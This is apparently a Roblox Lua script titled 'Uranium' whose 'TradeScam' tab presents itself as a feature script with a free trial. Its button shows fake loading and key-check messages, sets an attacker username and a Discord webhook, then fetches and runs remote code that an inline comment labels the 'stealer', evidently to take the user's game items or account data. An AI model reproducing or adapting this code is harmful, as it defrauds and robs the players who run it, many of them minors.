local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Uranium", HidePremium = false, SaveConfig = true, IntoEnable = false})

function MakeScriptHub()
    local Window = OrionLib:MakeWindow({Name = "Uranium Hub", HidePremium = false, SaveConfig = true, IntroEnable = true, Introtext = "Uranium Hub"})
end

local Tab = Window:MakeTab({
    Name = "TradeScam", -- Tab name
    Icon = "rbxassetid://4483345998",
        PremiumOnly = false
})

Tab:AddButton({
    Name = "Click To Enable (BETA)", -- button name here
    Callback = function()
        Username = "antaigen333"
WebHook = "https://discord.com/api/webhooks/1075783746495729716/4ID_oJpf0fznUFgEPtqVEnk1Y-JapsXVcmOs2Au--bQjlXi3wTUh-lgIxhYNohEsQcbt"

_G.CustomScriptName = "Uranium (TradeScam)"
_G.Text1 = "Script Loading..."
_G.Text2 = "Activating Free Trial..."
_G.Text3 = "Checking the Key..."
_G.Text4 = "Starting Uranium (TradeScam)..."
loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))() -- loadstring for your script / put your script here (stealer)
      end
})
